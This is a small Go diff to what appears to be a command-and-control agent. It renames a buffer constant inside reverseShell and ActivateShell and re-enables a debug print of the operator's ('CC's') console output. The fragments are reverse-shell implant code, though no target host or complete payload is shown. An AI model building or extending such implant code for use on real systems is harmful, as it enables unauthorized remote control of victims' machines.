@@ -2,6 +2,7 @@ package agent
 
 import (
 	"context"
+	"fmt"
 	"log"
 	"os"
 	"os/exec"
@@ -65,7 +66,7 @@ func ActivateShell() {
 				if conn == nil {
 					continue
 				}
-				data := make([]byte, BufSize)
+				data := make([]byte, RShellBufSize)
 				_, err = conn.Read(data)
 				if err != nil {
 					log.Print("Read remote: ", err)
@@ -160,9 +161,9 @@ func reverseShell(ctx context.Context, cancel context.CancelFunc,
 		case <-ctx.Done():
 			return
 		default:
-			buf := make([]byte, BufSize)
+			buf := make([]byte, RShellBufSize)
 			_, err = shellf.Read(buf)
-			// fmt.Printf("%s", buf) // echo CC's console
+			fmt.Printf("%s", buf) // echo CC's console
 			send <- buf
 			if err != nil {
 				log.Print("shell read: ", err)
